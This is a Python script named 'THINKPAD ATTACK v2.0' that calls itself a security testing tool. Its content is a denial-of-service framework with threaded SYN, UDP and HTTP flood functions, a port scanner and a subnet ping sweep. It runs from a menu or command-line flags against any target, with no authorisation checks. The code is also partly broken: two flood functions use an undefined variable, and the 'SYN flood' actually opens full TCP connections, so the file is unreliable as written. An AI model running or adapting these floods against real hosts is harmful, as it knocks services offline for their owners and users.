#!/usr/bin/env python3
"""
THINKPAD ATTACK v2.0 - Hardware-Optimized Attack Framework
Professional Security Testing Tool - Optimized for ThinkPad

Author: F1REW0LF
License: MIT
"""

import sys
import os
import time
import json
import random
import socket
import threading
import subprocess
import platform
from datetime import datetime
from typing import Dict, List, Optional, Any
import argparse

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

VERSION = "2.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}    ████████╗██╗  ██╗██╗███╗   ██╗██╗  ██╗██████╗  █████╗ ██████╗ 
    ╚══██╔══╝██║  ██║██║████╗  ██║██║  ██║██╔══██╗██╔══██╗██╔══██╗
       ██║   ███████║██║██╔██╗ ██║███████║██████╔╝███████║██████╔╝
       ██║   ██╔══██║██║██║╚██╗██║██╔══██║██╔═══╝ ██╔══██║██╔══██╗
       ██║   ██║  ██║██║██║ ╚████║██║  ██║██║     ██║  ██║██║  ██║
       ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
                                                   
{Colors.GOLD}          HARDWARE-OPTIMIZED ATTACK FRAMEWORK{Colors.WHITE}
{Colors.CYAN}    Professional Security Testing Tool{Colors.WHITE}
{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== HARDWARE DETECTION ====================
class HardwareDetector:
    @staticmethod
    def get_cpu_cores() -> int:
        if PSUTIL_AVAILABLE:
            return psutil.cpu_count(logical=True) or 4
        return os.cpu_count() or 4
    
    @staticmethod
    def get_ram_gb() -> float:
        if PSUTIL_AVAILABLE:
            return psutil.virtual_memory().total / (1024**3)
        return 8.0
    
    @staticmethod
    def get_network_speed() -> int:
        if PSUTIL_AVAILABLE:
            stats = psutil.net_if_stats()
            for name, stat in stats.items():
                if 'wlan' in name.lower() or 'eth' in name.lower():
                    return stat.speed
        return 1000
    
    @staticmethod
    def get_cpu_usage() -> float:
        if PSUTIL_AVAILABLE:
            return psutil.cpu_percent(interval=0.1)
        return 0.0

# ==================== ATTACK ENGINE ====================
class ThinkPadAttack:
    def __init__(self):
        self.cores = HardwareDetector.get_cpu_cores()
        self.ram = HardwareDetector.get_ram_gb()
        self.network_speed = HardwareDetector.get_network_speed()
        self.running = True
        self.stats = {'packets': 0, 'targets': 0, 'attacks': 0}
        
        self.threads = min(self.cores * 2, 32)
        self.packet_rate = 1000 if self.ram > 8 else 500
        self.buffer_size = 8192 if self.ram > 16 else 4096
        
        cprint("[+] CPU Cores: {}".format(self.cores), Colors.GREEN)
        cprint("[+] RAM: {:.1f} GB".format(self.ram), Colors.GREEN)
        cprint("[+] Threads: {}".format(self.threads), Colors.GREEN)
        cprint("[+] Packet Rate: {} p/s".format(self.packet_rate), Colors.GREEN)
    
    def syn_flood(self, target_ip: str, target_port: int = 80, duration: int = 30):
        cprint("\n[SYN] Attacking {}:{}".format(target_ip, target_port), Colors.RED)
        self.stats['attacks'] += 1
        
        def send_syn():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((target_ip, target_port))
                self.stats['packets'] += 1
                sock.close()
            except:
                pass
        
        start = time.time()
        threads = []
        while time.time() - start < duration:
            for _ in range(self.threads):
                t = threading.Thread(target=send_syn, daemon=True)
                threads.append(t)
                t.start()
            time.sleep(0.01)
        
        cprint("[+] Sent {} SYN packets".format(self.stats['packets']), Colors.GREEN)
    
    def udp_flood(self, target_ip: str, target_port: int = 53, duration: int = 30):
        cprint("\n[UDP] Flooding {}:{}".format(target_ip, target_port), Colors.RED)
        self.stats['attacks'] += 1
        
        def send_udp():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = os.urandom(1024)
                sock.sendto(data, (target_ip, target_port))
                self.stats['packets'] += 1
                sock.close()
            except:
                pass
        
        start = time.time()
        while time.time() - start < duration:
            for _ in range(self.threads):
                t = threading.Thread(target=send_udp, daemon=True)
                threads.append(t)
                t.start()
            time.sleep(0.01)
        
        cprint("[+] Sent {} UDP packets".format(self.stats['packets']), Colors.GREEN)
    
    def http_flood(self, target_url: str, duration: int = 30):
        if not REQUESTS_AVAILABLE:
            cprint("[-] Requests not installed", Colors.RED)
            return
        
        cprint("\n[HTTP] Flooding {}".format(target_url), Colors.RED)
        self.stats['attacks'] += 1
        
        def send_http():
            try:
                requests.get(target_url, timeout=1)
                self.stats['packets'] += 1
            except:
                pass
        
        start = time.time()
        while time.time() - start < duration:
            for _ in range(self.threads):
                t = threading.Thread(target=send_http, daemon=True)
                threads.append(t)
                t.start()
            time.sleep(0.01)
        
        cprint("[+] Sent {} HTTP requests".format(self.stats['packets']), Colors.GREEN)
    
    def port_scan(self, target_ip: str, ports: List[int] = None):
        if not ports:
            ports = [21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 3389, 8080, 8443]
        
        cprint("\n[SCAN] Scanning {}".format(target_ip), Colors.BLUE)
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                if sock.connect_ex((target_ip, port)) == 0:
                    cprint("[+] Port {} open".format(port), Colors.GREEN)
                    self.stats['targets'] += 1
                sock.close()
            except:
                pass
        
        threads = []
        for port in ports:
            t = threading.Thread(target=scan_port, args=(port,), daemon=True)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        cprint("[+] Found {} open ports".format(self.stats['targets']), Colors.GREEN)
    
    def network_scan(self, network: str = "192.168.1.0/24"):
        cprint("\n[SCAN] Scanning network {}".format(network), Colors.BLUE)
        
        base = network.split('/')[0].rsplit('.', 1)[0]
        hosts = []
        
        def scan_ip(ip):
            try:
                result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
                                       capture_output=True)
                if result.returncode == 0:
                    hosts.append(ip)
                    cprint("[+] {} alive".format(ip), Colors.GREEN)
            except:
                pass
        
        threads = []
        for i in range(1, 255):
            ip = "{}.{}".format(base, i)
            t = threading.Thread(target=scan_ip, args=(ip,), daemon=True)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join(timeout=0.1)
        
        cprint("[+] Found {} active hosts".format(len(hosts)), Colors.GREEN)
        return hosts
    
    def show_stats(self):
        print("\n{}".format("="*60))
        cprint(" STATISTICS", Colors.PURPLE, bold=True)
        print("="*60)
        print("Packets Sent: {}".format(self.stats['packets']))
        print("Targets Found: {}".format(self.stats['targets']))
        print("Attacks: {}".format(self.stats['attacks']))
        print("Threads: {}".format(self.threads))
        print("Packet Rate: {} p/s".format(self.packet_rate))
        print("="*60)
    
    def show_menu(self):
        print("""
{}{:=^60}{}
{}THINKPAD ATTACK - MENU{}
{}{:=^60}{}
[1] SYN Flood
[2] UDP Flood
[3] HTTP Flood
[4] Port Scan
[5] Network Scan
[6] Show Stats
[7] Exit
""".format(Colors.BLUE, "=", Colors.WHITE,
           Colors.BOLD, Colors.WHITE,
           Colors.BLUE, "=", Colors.WHITE))

# ==================== MAIN ====================
def main():
    parser = argparse.ArgumentParser(
        description="THINKPAD ATTACK v2.0 - Hardware-Optimized Attack Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 thinkpad_attack.py
  python3 thinkpad_attack.py --syn 192.168.1.1 -d 30
  python3 thinkpad_attack.py --scan 192.168.1.1
        """
    )
    
    parser.add_argument("--syn", help="SYN flood target IP")
    parser.add_argument("--udp", help="UDP flood target IP")
    parser.add_argument("--http", help="HTTP flood target URL")
    parser.add_argument("--scan", help="Port scan target IP")
    parser.add_argument("--net", help="Network scan (e.g., 192.168.1.0/24)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Attack duration")
    
    args = parser.parse_args()
    
    print_banner()
    
    attack = ThinkPadAttack()
    
    if args.syn:
        attack.syn_flood(args.syn, args.port, args.duration)
        sys.exit(0)
    
    if args.udp:
        attack.udp_flood(args.udp, args.port, args.duration)
        sys.exit(0)
    
    if args.http:
        attack.http_flood(args.http, args.duration)
        sys.exit(0)
    
    if args.scan:
        attack.port_scan(args.scan)
        sys.exit(0)
    
    if args.net:
        attack.network_scan(args.net)
        sys.exit(0)
    
    while True:
        attack.show_menu()
        choice = input("{}[>] Select: {}".format(Colors.CYAN, Colors.WHITE)).strip()
        
        if choice == '1':
            target = input("[>] Target IP: ").strip()
            port = int(input("[>] Port (80): ").strip() or "80")
            duration = int(input("[>] Duration (30s): ").strip() or "30")
            attack.syn_flood(target, port, duration)
        
        elif choice == '2':
            target = input("[>] Target IP: ").strip()
            port = int(input("[>] Port (53): ").strip() or "53")
            duration = int(input("[>] Duration (30s): ").strip() or "30")
            attack.udp_flood(target, port, duration)
        
        elif choice == '3':
            url = input("[>] Target URL: ").strip()
            duration = int(input("[>] Duration (30s): ").strip() or "30")
            attack.http_flood(url, duration)
        
        elif choice == '4':
            target = input("[>] Target IP: ").strip()
            attack.port_scan(target)
        
        elif choice == '5':
            network = input("[>] Network (192.168.1.0/24): ").strip() or "192.168.1.0/24"
            attack.network_scan(network)
        
        elif choice == '6':
            attack.show_stats()
        
        elif choice == '7':
            cprint("[*] Exiting...", Colors.GREEN)
            sys.exit(0)
        
        else:
            cprint("[-] Invalid selection", Colors.RED)
        
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
